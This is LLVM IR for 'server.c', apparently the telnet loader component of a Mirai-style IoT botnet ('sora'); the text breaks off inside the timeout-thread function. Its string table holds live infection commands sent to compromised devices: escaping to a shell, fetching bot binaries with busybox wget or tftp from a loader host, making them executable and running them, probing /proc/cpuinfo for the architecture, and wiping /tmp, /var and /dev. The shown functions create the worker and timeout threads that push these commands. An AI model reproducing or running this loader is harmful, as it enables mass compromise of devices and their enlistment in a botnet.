; ModuleID = 'server.c'
source_filename = "server.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.server = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i8*, i8*, %struct.server_worker*, %struct.connection**, i32*, i64, i16, i8, i8, i32 }
%struct.server_worker = type { %struct.server*, i32, i64, i8 }
%struct.connection = type { %union.pthread_mutex_t, %struct.server*, %struct.binary*, %struct.telnet_info, i32, i32, i32, i32, i32, i64, i32, %struct.anon, i16, i16, i8, i8, i8, i8, [8192 x i8] }
%union.pthread_mutex_t = type { %struct.__pthread_mutex_s }
%struct.__pthread_mutex_s = type { i32, i32, i32, i32, i32, i16, i16, %struct.__pthread_internal_list }
%struct.__pthread_internal_list = type { %struct.__pthread_internal_list*, %struct.__pthread_internal_list* }
%struct.binary = type { [6 x i8], i32, i8** }
%struct.telnet_info = type { [32 x i8], [32 x i8], [6 x i8], [32 x i8], i32, i16, i32, i8, i8 }
%struct.anon = type { [512 x i8], i32 }
%union.pthread_mutexattr_t = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.cpu_set_t = type { [16 x i64] }

@.str = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.2 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.5 = private unnamed_addr constant [10 x i8] c"/var/tmp/\00", align 1
@.str.6 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.7 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"/bin/\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"/etc/\00", align 1
@.str.11 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.12 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@tmp_dirs = dso_local global [13 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i32 0, i32 0)], align 16
@.str.13 = private unnamed_addr constant [11 x i8] c"epoll_wait\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.16 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.17 = private unnamed_addr constant [9 x i8] c"enable\0D\0A\00", align 1
@.str.18 = private unnamed_addr constant [9 x i8] c"system\0D\0A\00", align 1
@.str.19 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.20 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.21 = private unnamed_addr constant [20 x i8] c">%s.ptmx && cd %s\0D\0A\00", align 1
@.str.22 = private unnamed_addr constant [28 x i8] c"/bin/busybox rm -rf %s %s\0D\0A\00", align 1
@.str.23 = private unnamed_addr constant [7 x i8] c"19ju3d\00", align 1
@.str.24 = private unnamed_addr constant [7 x i8] c"902i13\00", align 1
@.str.25 = private unnamed_addr constant [98 x i8] c"/bin/busybox cp /bin/busybox 19ju3d; >19ju3d; /bin/busybox chmod 777 19ju3d; /bin/busybox AK1K2\0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [81 x i8] c"/bin/busybox cat /bin/busybox || while read i; do echo $i; done < /bin/busybox\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [21 x i8] c"/bin/busybox AK1K2\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [59 x i8] c"/bin/busybox wget; /bin/busybox tftp; /bin/busybox AK1K2\0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.30 = private unnamed_addr constant [103 x i8] c"/bin/busybox cat /proc/cpuinfo || while read i; do echo $i; done < /proc/cpuinfo; /bin/busybox AK1K2\0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [92 x i8] c"/bin/busybox cp 19ju3d 902i13; >902i13; /bin/busybox chmod 777 902i13; /bin/busybox AK1K2\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [109 x i8] c"/bin/busybox wget http://%s:%d/bins/%s.%s -O - > 19ju3d; /bin/busybox chmod 777 19ju3d; /bin/busybox AK1K2\0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [5 x i8] c"sora\00", align 1
@.str.34 = private unnamed_addr constant [92 x i8] c"/bin/busybox tftp -g -l %s -r %s.%s %s; /bin/busybox chmod 777 19ju3d; /bin/busybox AK1K2\0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [4 x i8] c"arc\00", align 1
@.str.36 = private unnamed_addr constant [36 x i8] c"./%s %s.echo; /bin/busybox O2J134\0D\0A\00", align 1
@.str.37 = private unnamed_addr constant [47 x i8] c"./%s > %s; ./%s %s.echo; /bin/busybox O2J134\0D\0A\00", align 1
@id_tag = external global i8*, align 8
@.str.38 = private unnamed_addr constant [40 x i8] c"./19ju3d %s.wget; /bin/busybox O2J134\0D\0A\00", align 1
@.str.39 = private unnamed_addr constant [42 x i8] c"/bin/busybox rm -f /tmp/* /var/* /dev/*\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [40 x i8] c"./19ju3d %s.tftp; /bin/busybox O2J134\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [98 x i8] c"/bin/busybox cp /bin/busybox 902i13; >902i13; /bin/busybox chmod 777 902i13; /bin/busybox AK1K2\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [5 x i8] c"arm7\00", align 1
@.str.43 = private unnamed_addr constant [54 x i8] c"/bin/busybox rm -rf %s; >19ju3d; /bin/busybox AK1K2\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [48 x i8] c"\03\1Akill %%1\0D\0A/bin/busybox rm -rf 19ju3d 902i13\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local %struct.server* @server_create(i8 zeroext %0, i8 zeroext %1, i32* %2, i32 %3, i8* %4, i16 zeroext %5, i8* %6) #0 {
  %8 = alloca %struct.server*, align 8
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  %11 = alloca i32*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  %14 = alloca i16, align 2
  %15 = alloca i8*, align 8
  %16 = alloca %struct.server*, align 8
  %17 = alloca %struct.server_worker*, align 8
  %18 = alloca i32, align 4
  %19 = alloca %struct.server_worker*, align 8
  store i8 %0, i8* %9, align 1
  store i8 %1, i8* %10, align 1
  store i32* %2, i32** %11, align 8
  store i32 %3, i32* %12, align 4
  store i8* %4, i8** %13, align 8
  store i16 %5, i16* %14, align 2
  store i8* %6, i8** %15, align 8
  %20 = call noalias align 16 i8* @calloc(i64 1, i64 96) #8
  %21 = bitcast i8* %20 to %struct.server*
  store %struct.server* %21, %struct.server** %16, align 8
  %22 = load i8, i8* %9, align 1
  %23 = zext i8 %22 to i64
  %24 = call noalias align 16 i8* @calloc(i64 %23, i64 32) #8
  %25 = bitcast i8* %24 to %struct.server_worker*
  store %struct.server_worker* %25, %struct.server_worker** %17, align 8
  store i32 0, i32* %18, align 4
  %26 = load i8, i8* %10, align 1
  %27 = load %struct.server*, %struct.server** %16, align 8
  %28 = getelementptr inbounds %struct.server, %struct.server* %27, i32 0, i32 17
  store i8 %26, i8* %28, align 1
  %29 = load i32*, i32** %11, align 8
  %30 = load %struct.server*, %struct.server** %16, align 8
  %31 = getelementptr inbounds %struct.server, %struct.server* %30, i32 0, i32 13
  store i32* %29, i32** %31, align 8
  %32 = load i32, i32* %12, align 4
  %33 = load %struct.server*, %struct.server** %16, align 8
  %34 = getelementptr inbounds %struct.server, %struct.server* %33, i32 0, i32 0
  store i32 %32, i32* %34, align 8
  %35 = load i8*, i8** %13, align 8
  %36 = load %struct.server*, %struct.server** %16, align 8
  %37 = getelementptr inbounds %struct.server, %struct.server* %36, i32 0, i32 9
  store i8* %35, i8** %37, align 8
  %38 = load i16, i16* %14, align 2
  %39 = load %struct.server*, %struct.server** %16, align 8
  %40 = getelementptr inbounds %struct.server, %struct.server* %39, i32 0, i32 15
  store i16 %38, i16* %40, align 8
  %41 = load i8*, i8** %15, align 8
  %42 = load %struct.server*, %struct.server** %16, align 8
  %43 = getelementptr inbounds %struct.server, %struct.server* %42, i32 0, i32 10
  store i8* %41, i8** %43, align 8
  %44 = load i32, i32* %12, align 4
  %45 = mul i32 %44, 2
  %46 = zext i32 %45 to i64
  %47 = call noalias align 16 i8* @calloc(i64 %46, i64 8) #8
  %48 = bitcast i8* %47 to %struct.connection**
  %49 = load %struct.server*, %struct.server** %16, align 8
  %50 = getelementptr inbounds %struct.server, %struct.server* %49, i32 0, i32 12
  store %struct.connection** %48, %struct.connection*** %50, align 8
  %51 = load i8, i8* %9, align 1
  %52 = zext i8 %51 to i64
  %53 = call noalias align 16 i8* @calloc(i64 %52, i64 32) #8
  %54 = bitcast i8* %53 to %struct.server_worker*
  %55 = load %struct.server*, %struct.server** %16, align 8
  %56 = getelementptr inbounds %struct.server, %struct.server* %55, i32 0, i32 11
  store %struct.server_worker* %54, %struct.server_worker** %56, align 8
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.server*, %struct.server** %16, align 8
  %59 = getelementptr inbounds %struct.server, %struct.server* %58, i32 0, i32 16
  store i8 %57, i8* %59, align 2
  %60 = load %struct.server*, %struct.server** %16, align 8
  %61 = getelementptr inbounds %struct.server, %struct.server* %60, i32 0, i32 12
  %62 = load %struct.connection**, %struct.connection*** %61, align 8
  %63 = icmp eq %struct.connection** %62, null
  br i1 %63, label %64, label %65

64:                                               ; preds = %7
  call void @exit(i32 0) #9
  unreachable

65:                                               ; preds = %7
  store i32 0, i32* %18, align 4
  br label %66

66:                                               ; preds = %99, %65
  %67 = load i32, i32* %18, align 4
  %68 = load i32, i32* %12, align 4
  %69 = mul i32 %68, 2
  %70 = icmp ult i32 %67, %69
  br i1 %70, label %71, label %102

71:                                               ; preds = %66
  %72 = call noalias align 16 i8* @calloc(i64 1, i64 8928) #8
  %73 = bitcast i8* %72 to %struct.connection*
  %74 = load %struct.server*, %struct.server** %16, align 8
  %75 = getelementptr inbounds %struct.server, %struct.server* %74, i32 0, i32 12
  %76 = load %struct.connection**, %struct.connection*** %75, align 8
  %77 = load i32, i32* %18, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.connection*, %struct.connection** %76, i64 %78
  store %struct.connection* %73, %struct.connection** %79, align 8
  %80 = load %struct.server*, %struct.server** %16, align 8
  %81 = getelementptr inbounds %struct.server, %struct.server* %80, i32 0, i32 12
  %82 = load %struct.connection**, %struct.connection*** %81, align 8
  %83 = load i32, i32* %18, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.connection*, %struct.connection** %82, i64 %84
  %86 = load %struct.connection*, %struct.connection** %85, align 8
  %87 = icmp eq %struct.connection* %86, null
  br i1 %87, label %88, label %89

88:                                               ; preds = %71
  call void @exit(i32 -1) #9
  unreachable

89:                                               ; preds = %71
  %90 = load %struct.server*, %struct.server** %16, align 8
  %91 = getelementptr inbounds %struct.server, %struct.server* %90, i32 0, i32 12
  %92 = load %struct.connection**, %struct.connection*** %91, align 8
  %93 = load i32, i32* %18, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.connection*, %struct.connection** %92, i64 %94
  %96 = load %struct.connection*, %struct.connection** %95, align 8
  %97 = getelementptr inbounds %struct.connection, %struct.connection* %96, i32 0, i32 0
  %98 = call i32 @pthread_mutex_init(%union.pthread_mutex_t* %97, %union.pthread_mutexattr_t* null) #8
  br label %99

99:                                               ; preds = %89
  %100 = load i32, i32* %18, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %18, align 4
  br label %66, !llvm.loop !6

102:                                              ; preds = %66
  store i32 0, i32* %18, align 4
  br label %103

103:                                              ; preds = %139, %102
  %104 = load i32, i32* %18, align 4
  %105 = load i8, i8* %9, align 1
  %106 = zext i8 %105 to i32
  %107 = icmp slt i32 %104, %106
  br i1 %107, label %108, label %142

108:                                              ; preds = %103
  %109 = load %struct.server*, %struct.server** %16, align 8
  %110 = getelementptr inbounds %struct.server, %struct.server* %109, i32 0, i32 11
  %111 = load %struct.server_worker*, %struct.server_worker** %110, align 8
  %112 = load i32, i32* %18, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %111, i64 %113
  store %struct.server_worker* %114, %struct.server_worker** %19, align 8
  %115 = load %struct.server*, %struct.server** %16, align 8
  %116 = load %struct.server_worker*, %struct.server_worker** %19, align 8
  %117 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %116, i32 0, i32 0
  store %struct.server* %115, %struct.server** %117, align 8
  %118 = load i32, i32* %18, align 4
  %119 = trunc i32 %118 to i8
  %120 = load %struct.server_worker*, %struct.server_worker** %19, align 8
  %121 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %120, i32 0, i32 3
  store i8 %119, i8* %121, align 8
  %122 = call i32 @epoll_create1(i32 0) #8
  %123 = load %struct.server_worker*, %struct.server_worker** %19, align 8
  %124 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %123, i32 0, i32 1
  store i32 %122, i32* %124, align 8
  %125 = icmp eq i32 %122, -1
  br i1 %125, label %126, label %133

126:                                              ; preds = %108
  %127 = load %struct.server*, %struct.server** %16, align 8
  %128 = getelementptr inbounds %struct.server, %struct.server* %127, i32 0, i32 11
  %129 = load %struct.server_worker*, %struct.server_worker** %128, align 8
  %130 = bitcast %struct.server_worker* %129 to i8*
  call void @free(i8* %130) #8
  %131 = load %struct.server*, %struct.server** %16, align 8
  %132 = bitcast %struct.server* %131 to i8*
  call void @free(i8* %132) #8
  store %struct.server* null, %struct.server** %8, align 8
  br label %149

133:                                              ; preds = %108
  %134 = load %struct.server_worker*, %struct.server_worker** %19, align 8
  %135 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %134, i32 0, i32 2
  %136 = load %struct.server_worker*, %struct.server_worker** %19, align 8
  %137 = bitcast %struct.server_worker* %136 to i8*
  %138 = call i32 @pthread_create(i64* %135, %union.pthread_attr_t* null, i8* (i8*)* @worker, i8* %137) #8
  br label %139

139:                                              ; preds = %133
  %140 = load i32, i32* %18, align 4
  %141 = add nsw i32 %140, 1
  store i32 %141, i32* %18, align 4
  br label %103, !llvm.loop !8

142:                                              ; preds = %103
  %143 = load %struct.server*, %struct.server** %16, align 8
  %144 = getelementptr inbounds %struct.server, %struct.server* %143, i32 0, i32 14
  %145 = load %struct.server*, %struct.server** %16, align 8
  %146 = bitcast %struct.server* %145 to i8*
  %147 = call i32 @pthread_create(i64* %144, %union.pthread_attr_t* null, i8* (i8*)* @timeout_thread, i8* %146) #8
  %148 = load %struct.server*, %struct.server** %16, align 8
  store %struct.server* %148, %struct.server** %8, align 8
  br label %149

149:                                              ; preds = %142, %126
  %150 = load %struct.server*, %struct.server** %8, align 8
  ret %struct.server* %150
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #2

; Function Attrs: nounwind
declare i32 @pthread_mutex_init(%union.pthread_mutex_t*, %union.pthread_mutexattr_t*) #1

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #1

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i8* @worker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.server_worker*, align 8
  %4 = alloca [128 x %struct.epoll_event], align 16
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  %7 = load i8*, i8** %2, align 8
  %8 = bitcast i8* %7 to %struct.server_worker*
  store %struct.server_worker* %8, %struct.server_worker** %3, align 8
  %9 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %10 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %9, i32 0, i32 3
  %11 = load i8, i8* %10, align 8
  %12 = zext i8 %11 to i32
  call void @bind_core(i32 %12)
  br label %13

13:                                               ; preds = %1, %35
  %14 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %15 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %14, i32 0, i32 1
  %16 = load i32, i32* %15, align 8
  %17 = getelementptr inbounds [128 x %struct.epoll_event], [128 x %struct.epoll_event]* %4, i64 0, i64 0
  %18 = call i32 @epoll_wait(i32 %16, %struct.epoll_event* %17, i32 127, i32 -1)
  store i32 %18, i32* %6, align 4
  %19 = load i32, i32* %6, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %22

21:                                               ; preds = %13
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.13, i64 0, i64 0))
  br label %22

22:                                               ; preds = %21, %13
  store i32 0, i32* %5, align 4
  br label %23

23:                                               ; preds = %32, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %6, align 4
  %26 = icmp slt i32 %24, %25
  br i1 %26, label %27, label %35

27:                                               ; preds = %23
  %28 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [128 x %struct.epoll_event], [128 x %struct.epoll_event]* %4, i64 0, i64 %30
  call void @handle_event(%struct.server_worker* %28, %struct.epoll_event* %31)
  br label %32

32:                                               ; preds = %27
  %33 = load i32, i32* %5, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %5, align 4
  br label %23, !llvm.loop !9

35:                                               ; preds = %23
  br label %13
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i8* @timeout_thread(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.server*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.connection*, align 8
  store i8* %0, i8** %2, align 8
  %7 = load i8*, i8** %2, align 8
  %8 = bitcast i8* %7 to %struct.server*
  store %struct.server* %8, %struct.server** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 0, i32* %5, align 4
  br label %9

9:                                                ; preds = %1, %159
  %10 = call i64 @time(i64* null) #8
  %11 = trunc i64 %10 to i32
  store i32 %11, i32* %5, align 4
  store i32 0, i32* %4, align 4
  br label %12

12:                                               ; preds = %156, %9
  %13 = load i32, i32* %4, align 4
  %14 = load %struct.server*, %struct.server** %3, align 8
  %15 = getelementptr inbounds %struct.server, %struct.server* %14, i32 0, i32 0
  %16 = load i32, i32* %15, align 8
  %17 = mul i32 %16, 2
  %18 = icmp ult i32 %13, %17
  br i1 %18, label %19, label %159

19:                                               ; preds = %12
  %20 = load %struct.server*, %struct.server** %3, align 8
  %21 = getelementptr inbounds %struct.server, %struct.server* %20, i32 0, i32 12
  %22 = load %struct.connection**, %struct.connection*** %21, align 8
  %23 = load i32, i32* %4, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds %struct.connection*, %struct.connection** %22, i64 %24
  %26 = load %struct.connection*, %struct.connection** %25, align 8
  store %struct.connection* %26, %struct.connection** %6, align 8
  %27 = load %struct.connection*, %struct.connection** %6, align 8
  %28 = getelementptr inbounds %struct.connection, %struct.connection* %27, i32 0, i32 14
  %29 = load i8, i8* %28, align 4
  %30 = sext i8 %29 to i32
  %31 = icmp ne i32 %30, 0
  br i1 %31, label %32, label %122

32:                                               ; preds = %19
  %33 = load %struct.connection*, %struct.connection** %6, align 8
  %34 = getelementptr inbounds %struct.connection, %struct.connection* %33, i32 0, i32 9
  %35 = load i64, i64* %34, align 8
  %36 = icmp sgt i64 %35, 0
  br i1 %36, label %37, label %122

37:                                               ; preds = %32
  %38 = load i32, i32* %5, align 4
  %39 = sext i32 %38 to i64
  %40 = load %struct.connection*, %struct.connection** %6, align 8
  %41 = getelementptr inbounds %struct.connection, %struct.connection* %40, i32 0, i32 9
  %42 = load i64, i64* %41, align 8
  %43 = sub nsw i64 %39, %42
  %44 = load %struct.connection*, %struct.connection** %6, align 8
  %45 = getelementptr inbounds %struct.connection, %struct.connection* %44, i32 0, i32 13
  %46 = load i16, i16* %45, align 2
  %47 = zext i16 %46 to i64
  %48 = icmp sgt i64 %43, %47
  br i1 %48, label %49, label %122

49:                                               ; preds = %37
  %50 = load %struct.connection*, %struct.connection** %6, align 8
  %51 = getelementptr inbounds %struct.connection, %struct.connection* %50, i32 0, i32 10
  %52 = load i32, i32* %51, align 8
  %53 = icmp eq i32 %52, 17
  br i1 %53, label %54, label %119

54:                                               ; preds = %49
  %55 = load %struct.connection*, %struct.connection** %6, align 8
  %56 = getelementptr inbounds %struct.connection, %struct.connection* %55, i32 0, i32 17
  %57 = load i8, i8* %56, align 1
  %58 = icmp ne i8 %57, 0
  br i1 %58, label %119, label %59

59:                                               ; preds = %54
  %60 = load %struct.connection*, %struct.connection** %6, align 8
  %61 = getelementptr inbounds %struct.connection, %struct.connection* %60, i32 0, i32 3
  %62 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %61, i32 0, i32 2
  %63 = getelementptr inbounds [6 x i8], [6 x i8]* %62, i64 0, i64 0
  %64 = call i32 @strncmp(i8* %63, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.29, i64 0, i64 0), i64 3) #10
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %119

66:                                               ; preds = %59
  %67 = call i64 @time(i64* null) #8
  %68 = load %struct.connection*, %struct.connection** %6, align 8
  %69 = getelementptr inbounds %struct.connection, %struct.connection* %68, i32 0, i32 9
  store i64 %67, i64* %69, align 8
  %70 = load %struct.connection*, %struct.connection** %6, align 8
  %71 = getelementptr inbounds %struct.connection, %struct.connection* %70, i32 0, i32 4
  %72 = load i32, i32* %71, align 8
  %73 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %72, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.44, i64 0, i64 0))
  %74 = load %struct.connection*, %struct.connection** %6, align 8
  %75 = getelementptr inbounds %struct.connection, %struct.connection* %74, i32 0, i32 17
  store i8 1, i8* %75, align 1
  %76 = load %struct.connection*, %struct.connection** %6, align 8
  %77 = getelementptr inbounds %struct.connection, %struct.connection* %76, i32 0, i32 5
  store i32 0, i32* %77, align 4
  %78 = load %struct.connection*, %struct.connection** %6, align 8
  %79 = getelementptr inbounds %struct.connection, %struct.connection* %78, i32 0, i32 6
  store i32 0, i32* %79, align 8
  %80 = load %struct.connection*, %struct.connection** %6, align 8
  %81 = getelementptr inbounds %struct.connection, %struct.connection* %80, i32 0, i32 7
  store i32 0, i32* %81, align 4
  %82 = load %struct.connection*, %struct.connection** %6, align 8
  %83 = getelementptr inbounds %struct.connection, %struct.connection* %82, i32 0, i32 8
  store i32 0, i32* %83, align 8
  %84 = load %struct.connection*, %struct.connection** %6, align 8
  %85 = getelementptr inbounds %struct.connection, %struct.connection* %84, i32 0, i32 3
  %86 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %85, i32 0, i32 2
  %87 = getelementptr inbounds [6 x i8], [6 x i8]* %86, i64 0, i64 0
  %88 = load %struct.connection*, %struct.connection** %6, align 8
  %89 = getelementptr inbounds %struct.connection, %struct.connection* %88, i32 0, i32 3
  %90 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %89, i32 0, i32 2
  %91 = getelementptr inbounds [6 x i8], [6 x i8]* %90, i64 0, i64 3
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %93, 0
  %95 = zext i1 %94 to i64
  %96 = select i1 %94, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.42, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.29, i64 0, i64 0)
  %97 = call i8* @strcpy(i8* %87, i8* %96) #8
  %98 = load %struct.connection*, %struct.connection** %6, align 8
  %99 = getelementptr inbounds %struct.connection, %struct.connection* %98, i32 0, i32 3
  %100 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %99, i32 0, i32 2
  %101 = getelementptr inbounds [6 x i8], [6 x i8]* %100, i64 0, i64 0
  %102 = load %struct.connection*, %struct.connection** %6, align 8
  %103 = getelementptr inbounds %struct.connection, %struct.connection* %102, i32 0, i32 3
  %104 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %103, i32 0, i32 2
  %105 = getelementptr inbounds [6 x i8], [6 x i8]* %104, i64 0, i64 0
  %106 = call i64 @strlen(i8* %105) #10
  %107 = trunc i64 %106 to i32
  %108 = call %struct.binary* @binary_get_by_arch(i8* %101, i32 %107)
  %109 = load %struct.connection*, %struct.connection** %6, align 8
  %110 = getelementptr inbounds %struct.connection, %struct.connection* %109, i32 0, i32 2
  store %struct.binary* %108, %struct.binary** %110, align 8
  %111 = load %struct.connection*, %struct.connection** %6, align 8
  %112 = getelementptr inbounds %struct.connection, %struct.connection* %111, i32 0, i32 4
  %113 = load i32, i32* %112, align 8
  %114 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %113, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.28, i64 0, i64 0))
  %115 = load %struct.connection*, %struct.connection** %6, align 8
  %116 = getelementptr inbounds %struct.connection, %struct.connection* %115, i32 0, i32 10
  store i32 13, i32* %116, align 8
  %117 = load %struct.connection*, %struct.connection** %6, align 8
  %118 = getelementptr inbounds %struct.connection, %struct.connection* %117, i32 0, i32 16
  store i8 1, i8* %118, align 2
  br label %121

119:                                              ; preds = %59, %54, %49
  %120 = load %struct.connection*, %struct.connection** %6, align 8
  call void @connection_close(%struct.connection* %120)
  br label %121

121:                                              ; preds = %119, %66
  br label %155

122:                                              ; preds = %37, %32, %19
  %123 = load %struct.connection*, %struct.connection** %6, align 8
  %124 = getelementptr inbounds %struct.connection, %struct.connection* %123, i32 0, i32 14
  %125 = load i8, i8* %124, align 4
  %126 = sext i8 %125 to i32
  %127 = icmp ne i32 %126, 0
  br i1 %127, label %128, label %154

128:                                              ; preds = %122
  %129 = load %struct.connection*, %struct.connection** %6, align 8
  %130 = getelementptr inbounds %struct.connection, %struct.connection* %129, i32 0, i32 11
  %131 = getelementptr inbounds %struct.anon, %struct.anon* %130, i32 0, i32 1
  %132 = load i32, i32* %131, align 4
  %133 = icmp ne i32 %132, 0
  br i1 %133, label %134, label %154

134:                                              ; preds = %128
  %135 = call i64 @time(i64* null) #8
  %136 = load %struct.connection*, %struct.connection** %6, align 8
  %137 = getelementptr inbounds %struct.connection, %struct.connection* %136, i32 0, i32 11
  %138 = getelementptr inbounds %struct.anon, %struct.anon* %137, i32 0, i32 1
  %139 = load i32, i32* %138, align 4
  %140 = sext i32 %139 to i64
  %141 = icmp sgt i64 %135, %140
  br i1 %141, label %142, label %154

142:                                              ; preds = %134
  %143 = load %struct.connection*, %struct.connection** %6, align 8
  %144 = getelementptr inbounds %struct.connection, %struct.connection* %143, i32 0, i32 11
  %145 = getelementptr inbounds %struct.anon, %struct.anon* %144, i32 0, i32 1
  store i32 0, i32* %145, align 4
  %146 = load %struct.connection*, %struct.connection** %6, align 8
  %147 = getelementptr inbounds %struct.connection, %struct.connection* %146, i32 0, i32 4
  %148 = load i32, i32* %147, align 8
  %149 = load %struct.connection*, %struct.connection** %6, align 8
  %150 = getelementptr inbounds %struct.connection, %struct.connection* %149, i32 0, i32 11
  %151 = getelementptr inbounds %struct.anon, %struct.anon* %150, i32 0, i32 0
  %152 = getelementptr inbounds [512 x i8], [512 x i8]* %151, i64 0, i64 0
  %153 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %148, i8* %152)
  br label %154

154:                                              ; preds = %142, %134, %128, %122
  br label %155

155:                                              ; preds = %154, %121
  br label %156

156:                                              ; preds = %155
  %157 = load i32, i32* %4, align 4
  %158 = add nsw i32 %157, 1
  store i32 %158, i32* %4, align 4
  br label %12, !llvm.loop !10

159:                                              ; preds = %12
